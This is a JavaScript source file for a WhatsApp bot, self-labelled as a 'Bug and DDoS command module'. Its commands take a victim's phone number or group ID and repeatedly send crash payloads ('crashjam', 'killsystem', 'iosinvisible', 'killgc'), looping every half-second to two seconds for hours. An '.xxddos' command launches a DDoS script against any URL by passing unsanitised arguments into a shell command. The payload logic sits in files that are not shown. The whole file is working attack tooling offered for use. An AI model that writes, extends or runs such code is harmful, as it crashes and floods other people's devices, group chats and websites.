// ─────────────────────────────────────────────
//  Al-Jin · modules/xeon-commands.js
//  Bug and DDoS command module
// ─────────────────────────────────────────────
import { createRequire } from 'node:module';
import { spawn } from 'node:child_process';
import path from 'node:path';
import { isOwner } from '../core/identity.js';

const require = createRequire(import.meta.url);

const SYLoves = '../SY/S7/';

const stickerLogic = require(SYLoves + 'StickerCrash.js');
const CallLogic = require(SYLoves + 'CallCrash.js');
const IosLogic = require(SYLoves + 'IosInvisible.js');
const XgcLogic = require(SYLoves + 'Xgc.js');
const gcFrzLogic = require(SYLoves + 'gcFrz.js');
const crashjamLogic = require(SYLoves + 'crashjam.js');
const killsystemLogic = require(SYLoves + 'killsystem.js');
const crashfinityLogic = require(SYLoves + 'crashfinity.js');
const xdelayLogic = require(SYLoves + 'Xdelay.js');
const xbetainvisLogic = require(SYLoves + 'xbetainvis.js');
const testlogic = require(SYLoves + 'test.js');

function isAllowed(msg) {
  const sender = msg.key.participant || msg.key.remoteJid;
  return msg.key.fromMe || isOwner(sender);
}

function cleanNumber(input) {
  return (input || '').replace(/[^0-9]/g, '');
}

function notifySending(sock, chat, target, cmdName = 'BUG') {
  const caption = `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n┃ ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...\n┃ ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ sᴇɴᴅɪɴɢ ${cmdName.toUpperCase()}\n┃ Tᴀʀɢᴇᴛ : ${target}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
  return sock.sendMessage(chat, { text: caption });
}

async function notifyResult(sock, chat, target, cmdName, result, quotedMsg) {
  if (result && result.success) {
    const text = `┏━━━━━━〣 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ 📦 Status  : DELIVERED\n┃ 📬 Packets : ${result.deliveredCount || 1} delivered\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
  } else {
    const errReason = result?.errors?.[0] || 'Payload delivery rejected by target server/device';
    const text = `┏━━━━━━〣 𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 〣━━━━━━━┓\n┃ 🎯 Target  : ${target}\n┃ ⚡ Command : .${cmdName}\n┃ ❌ Status  : UNDELIVERED\n┃ ⚠️ Reason  : ${errReason}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`;
    return sock.sendMessage(chat, { text }, { quoted: quotedMsg });
  }
}

async function checkWhatsAppUser(sock, cleanTarget) {
  if (!cleanTarget) return false;
  try {
    const res = await sock.onWhatsApp(cleanTarget);
    if (!res || !res.length) return true; // Fallback if WhatsApp user lookup is restricted
    const existsObj = Array.isArray(res) ? res[0] : res;
    return Boolean(existsObj && existsObj.exists !== false);
  } catch (e) {
    return true; // Fallback if lookup fails
  }
}

export async function crashjamCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: '❌ Usage:\n.crashjam <number> [hours or "only count"]\nExample: .crashjam +919876543210 1\nExample: .crashjam +919876543210 only 5' }, { quoted: msg });
  }

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'crashjam');

    let totalDelivered = 0;
    const errors = [];

    if (!args[1] || args[1] === 'only') {
      const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : 1;
      for (let i = 0; i < count; i++) {
        try {
          const res = await crashjamLogic.crashjam(sock, targetJid);
          if (res?.success) totalDelivered += (res.deliveredCount || 1);
          else if (res?.errors) errors.push(...res.errors);
        } catch (e) {
          errors.push(e.message);
        }
      }
    } else {
      const hours = parseInt(args[1]) || 1;
      const endTime = Date.now() + hours * 60 * 60 * 1000;
      try {
        const res = await crashjamLogic.crashjam(sock, targetJid);
        if (res?.success) totalDelivered += (res.deliveredCount || 1);
        else if (res?.errors) errors.push(...res.errors);
      } catch (e) {
        errors.push(e.message);
      }

      const interval = setInterval(async () => {
        if (Date.now() >= endTime) { clearInterval(interval); return; }
        try {
          await crashjamLogic.crashjam(sock, targetJid);
        } catch (e) {}
      }, 2000);
    }

    await notifyResult(sock, chat, cleanTarget, 'crashjam', { success: totalDelivered > 0, deliveredCount: totalDelivered, errors }, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'crashjam', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function killsystemCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: '❌ Usage:\n.killsystem <number> [hours or "only count"]\nExample: .killsystem +919876543210 1' }, { quoted: msg });
  }

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'killsystem');

    let totalDelivered = 0;
    const errors = [];

    if (!args[1] || args[1] === 'only') {
      const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : 1;
      for (let i = 0; i < count; i++) {
        try {
          const res = await killsystemLogic.killsystem(sock, targetJid);
          if (res?.success) totalDelivered += (res.deliveredCount || 1);
          else if (res?.errors) errors.push(...res.errors);
        } catch (e) {
          errors.push(e.message);
        }
      }
    } else {
      const hours = parseInt(args[1]) || 1;
      const endTime = Date.now() + hours * 60 * 60 * 1000;
      try {
        const res = await killsystemLogic.killsystem(sock, targetJid);
        if (res?.success) totalDelivered += (res.deliveredCount || 1);
        else if (res?.errors) errors.push(...res.errors);
      } catch (e) {
        errors.push(e.message);
      }

      const interval = setInterval(async () => {
        if (Date.now() >= endTime) { clearInterval(interval); return; }
        try {
          await killsystemLogic.killsystem(sock, targetJid);
        } catch (e) {}
      }, 2000);
    }

    await notifyResult(sock, chat, cleanTarget, 'killsystem', { success: totalDelivered > 0, deliveredCount: totalDelivered, errors }, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'killsystem', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function crashfinityCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .crashfinity <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'crashfinity');
    const res = await crashfinityLogic.crashfinity(sock, targetJid);
    await notifyResult(sock, chat, cleanTarget, 'crashfinity', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'crashfinity', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function stickercrashCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .stickercrash <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'stickercrash');
    let res = { success: false, deliveredCount: 0, errors: ['Function not found'] };
    if (typeof stickerLogic.StickerCrash === 'function') {
      res = await stickerLogic.StickerCrash(sock, targetJid);
    }
    await notifyResult(sock, chat, cleanTarget, 'stickercrash', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'stickercrash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function callcrashCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .callcrash <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'callcrash');
    let res = { success: false, deliveredCount: 0, errors: ['Function not found'] };
    if (typeof CallLogic.CallCrash === 'function') {
      res = await CallLogic.CallCrash(sock, targetJid);
    }
    await notifyResult(sock, chat, cleanTarget, 'callcrash', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'callcrash', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xdelayCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xdelay <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'xdelay');
    let res = { success: false, deliveredCount: 0, errors: ['Function not found'] };
    if (typeof xdelayLogic.Xdelay === 'function') {
      res = await xdelayLogic.Xdelay(sock, targetJid);
    }
    await notifyResult(sock, chat, cleanTarget, 'xdelay', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'xdelay', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xbetainvisCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) return sock.sendMessage(chat, { text: '❌ Usage: .xbetainvis <number>' }, { quoted: msg });

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'xbetainvis');
    let res = { success: false, deliveredCount: 0, errors: ['Function not found'] };
    if (typeof xbetainvisLogic.xbetainvis === 'function') {
      res = await xbetainvisLogic.xbetainvis(sock, targetJid);
    }
    await notifyResult(sock, chat, cleanTarget, 'xbetainvis', res, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'xbetainvis', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function iosinvisibleCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: '❌ Usage: .iosinvisible <number> [hours or "only count"]\nExample: .iosinvisible +919876543210 1' }, { quoted: msg });
  }

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'iosinvisible');

    let totalDelivered = 0;
    const errors = [];

    if (!args[1] || args[1] === 'only') {
      const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : 1;
      for (let i = 0; i < count; i++) {
        try {
          const res = await IosLogic.IosInvisible(sock, targetJid);
          if (res?.success) totalDelivered += (res.deliveredCount || 1);
          else if (res?.errors) errors.push(...res.errors);
        } catch (e) {
          errors.push(e.message);
        }
      }
    } else {
      const hours = parseInt(args[1]) || 1;
      const endTime = Date.now() + hours * 60 * 60 * 1000;
      try {
        const res = await IosLogic.IosInvisible(sock, targetJid);
        if (res?.success) totalDelivered += (res.deliveredCount || 1);
        else if (res?.errors) errors.push(...res.errors);
      } catch (e) {
        errors.push(e.message);
      }

      const interval = setInterval(async () => {
        if (Date.now() >= endTime) { clearInterval(interval); return; }
        try {
          await IosLogic.IosInvisible(sock, targetJid);
        } catch (e) {}
      }, 500);
    }

    await notifyResult(sock, chat, cleanTarget, 'iosinvisible', { success: totalDelivered > 0, deliveredCount: totalDelivered, errors }, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'iosinvisible', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xgroupCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: '❌ Usage: .xgroup <groupJid> [hours]\nExample: .xgroup 123456789@g.us 1' }, { quoted: msg });
  }

  const targetJid = args[0].trim();
  const hours = parseInt(args[1]) || 1;

  if (!targetJid.endsWith('@g.us')) {
    return sock.sendMessage(chat, { text: '❌ Invalid group JID (must end with @g.us)' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetJid, 'xgroup');
    let totalDelivered = 0;
    const errors = [];

    if (typeof XgcLogic.Xgc === 'function') {
      try {
        const res = await XgcLogic.Xgc(sock, targetJid);
        if (res?.success) totalDelivered += (res.deliveredCount || 1);
        else if (res?.errors) errors.push(...res.errors);
      } catch (e) {
        errors.push(e.message);
      }
    }

    const endTime = Date.now() + hours * 60 * 60 * 1000;
    const interval = setInterval(async () => {
      if (Date.now() >= endTime) { clearInterval(interval); return; }
      try {
        if (typeof XgcLogic.Xgc === 'function') {
          await XgcLogic.Xgc(sock, targetJid);
        }
      } catch (e) {}
    }, 2000);

    await notifyResult(sock, chat, targetJid, 'xgroup', { success: totalDelivered > 0, deliveredCount: totalDelivered, errors }, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetJid, 'xgroup', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function killgcCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: '❌ Usage: .killgc <groupJid> [hours]\nExample: .killgc 123456789@g.us 1' }, { quoted: msg });
  }

  const targetJid = args[0].trim();
  const hours = parseInt(args[1]) || 1;

  if (!targetJid.endsWith('@g.us')) {
    return sock.sendMessage(chat, { text: '❌ Invalid group JID (must end with @g.us)' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetJid, 'killgc');
    let totalDelivered = 0;
    const errors = [];

    if (typeof gcFrzLogic.gcFrz === 'function') {
      try {
        const res = await gcFrzLogic.gcFrz(sock, targetJid);
        if (res?.success) totalDelivered += (res.deliveredCount || 1);
        else if (res?.errors) errors.push(...res.errors);
      } catch (e) {
        errors.push(e.message);
      }
    }

    const endTime = Date.now() + hours * 60 * 60 * 1000;
    const interval = setInterval(async () => {
      if (Date.now() >= endTime) { clearInterval(interval); return; }
      try {
        if (typeof gcFrzLogic.gcFrz === 'function') {
          await gcFrzLogic.gcFrz(sock, targetJid);
        }
      } catch (e) {}
    }, 2000);

    await notifyResult(sock, chat, targetJid, 'killgc', { success: totalDelivered > 0, deliveredCount: totalDelivered, errors }, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetJid, 'killgc', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function trashsysgpCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: '❌ Usage: .trashsysgp <groupJid> [hours]' }, { quoted: msg });
  }

  const targetJid = args[0].trim();
  const hours = parseInt(args[1]) || 1;

  if (!targetJid.endsWith('@g.us')) {
    return sock.sendMessage(chat, { text: '❌ Invalid group JID' }, { quoted: msg });
  }

  try {
    await notifySending(sock, chat, targetJid, 'trashsysgp');
    let totalDelivered = 0;
    const errors = [];

    try {
      if (typeof killsystemLogic.killsystem === 'function') {
        const r1 = await killsystemLogic.killsystem(sock, targetJid);
        if (r1?.success) totalDelivered += (r1.deliveredCount || 1);
      }
      if (typeof gcFrzLogic.gcFrz === 'function') {
        const r2 = await gcFrzLogic.gcFrz(sock, targetJid);
        if (r2?.success) totalDelivered += (r2.deliveredCount || 1);
      }
    } catch (e) {
      errors.push(e.message);
    }

    const endTime = Date.now() + hours * 60 * 60 * 1000;
    const interval = setInterval(async () => {
      if (Date.now() >= endTime) { clearInterval(interval); return; }
      try {
        if (typeof killsystemLogic.killsystem === 'function') {
          await killsystemLogic.killsystem(sock, targetJid);
        }
        if (typeof gcFrzLogic.gcFrz === 'function') {
          await gcFrzLogic.gcFrz(sock, targetJid);
        }
      } catch (e) {}
    }, 2000);

    await notifyResult(sock, chat, targetJid, 'trashsysgp', { success: totalDelivered > 0, deliveredCount: totalDelivered, errors }, msg);
  } catch (err) {
    await notifyResult(sock, chat, targetJid, 'trashsysgp', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function testCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: '❌ Usage: .test <number> [count or "only" count]' }, { quoted: msg });
  }

  const cleanTarget = cleanNumber(args[0]);
  if (!cleanTarget) return sock.sendMessage(chat, { text: '❌ Invalid phone number.' }, { quoted: msg });
  const targetJid = `${cleanTarget}@s.whatsapp.net`;

  try {
    const exists = await checkWhatsAppUser(sock, cleanTarget);
    if (!exists) return sock.sendMessage(chat, { text: `❌ ${cleanTarget} is not on WhatsApp` }, { quoted: msg });

    await notifySending(sock, chat, cleanTarget, 'test');

    const count = args[1] === 'only' ? (parseInt(args[2]) || 1) : (parseInt(args[1]) || 1);
    let totalDelivered = 0;
    const errors = [];

    for (let i = 0; i < count; i++) {
      try {
        const res = await testlogic.test(sock, targetJid);
        if (res?.success) totalDelivered += (res.deliveredCount || 1);
        else if (res?.errors) errors.push(...res.errors);
      } catch (e) {
        errors.push(e.message);
      }
    }

    await notifyResult(sock, chat, cleanTarget, 'test', { success: totalDelivered > 0, deliveredCount: totalDelivered, errors }, msg);
  } catch (err) {
    await notifyResult(sock, chat, cleanTarget, 'test', { success: false, deliveredCount: 0, errors: [err.message] }, msg);
  }
}

export async function xxddosCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (args.length < 2) {
    return sock.sendMessage(chat, { text: '❌ Usage: .xxddos <url> <timeInSeconds>\nExample: .xxddos https://example.com 60' }, { quoted: msg });
  }

  const targetUrl = args[0];
  const timeSec = args[1];

  await sock.sendMessage(chat, {
    text: `⚡ *Attacking Target*\n\n🎯 Target: \`${targetUrl}\`\n⏱ Time: \`${timeSec}\` seconds\n\n⚙️ Process started...`
  }, { quoted: msg });

  const ddosScript = path.join(process.cwd(), 'SY', 'ddos.js');
  spawn(`node "${ddosScript}" "${targetUrl}" "${timeSec}"`, {
    shell: true,
    stdio: 'inherit'
  });
}

export async function groupidCommand(sock, chat, msg, args) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });
  if (!args[0]) {
    return sock.sendMessage(chat, { text: 'Usage: .groupid <group link>\nExample: .groupid https://chat.whatsapp.com/ABC123XYZ' }, { quoted: msg });
  }

  const inviteLink = args[0].trim();
  if (!inviteLink.includes('chat.whatsapp.com/')) {
    return sock.sendMessage(chat, { text: 'Invalid WhatsApp group link.' }, { quoted: msg });
  }

  const inviteCode = inviteLink.split('chat.whatsapp.com/')[1]?.trim();
  if (!inviteCode) return sock.sendMessage(chat, { text: 'Link format incorrect.' }, { quoted: msg });

  try {
    const result = await sock.groupAcceptInvite(inviteCode);
    if (!result) return sock.sendMessage(chat, { text: 'Failed to join or invalid invite code.' }, { quoted: msg });

    const groupJid = typeof result === 'string' ? result : result.gid;
    const meta = await sock.groupMetadata(groupJid);

    let text = `Group Info:\n\n`;
    text += `Name: ${meta.subject || 'No Name'}\n`;
    text += `JID: ${groupJid}\n`;
    text += `Members: ${meta.participants?.length || '?'}\n`;

    await sock.sendMessage(chat, { text }, { quoted: msg });
  } catch (err) {
    sock.sendMessage(chat, { text: `Error fetching group info: ${err.message}` }, { quoted: msg });
  }
}

export async function listgcCommand(sock, chat, msg) {
  if (!isAllowed(msg)) return sock.sendMessage(chat, { text: '⛔ Owner only.' }, { quoted: msg });

  try {
    const groupsObj = await sock.groupFetchAllParticipating();
    const groups = Object.values(groupsObj);

    if (groups.length === 0) {
      return sock.sendMessage(chat, { text: '❌ No WhatsApp groups found.' }, { quoted: msg });
    }

    let output = `⬣ *WHATSAPP GROUPS (${groups.length} total)*\n\n`;
    let index = 1;

    for (const group of groups) {
      output += `❏ Group ${index++}\n`;
      output += `│⭔ *Name:* ${group.subject || 'Unnamed'}\n`;
      output += `│⭔ *ID:* \`${group.id}\`\n`;
      output += `│⭔ *Members:* ${group.participants?.length || 0}\n`;
      output += `╰──────────────\n\n`;
    }

    await sock.sendMessage(chat, { text: output }, { quoted: msg });
  } catch (err) {
    sock.sendMessage(chat, { text: `⚠️ Failed to fetch groups: ${err.message}` }, { quoted: msg });
  }
}
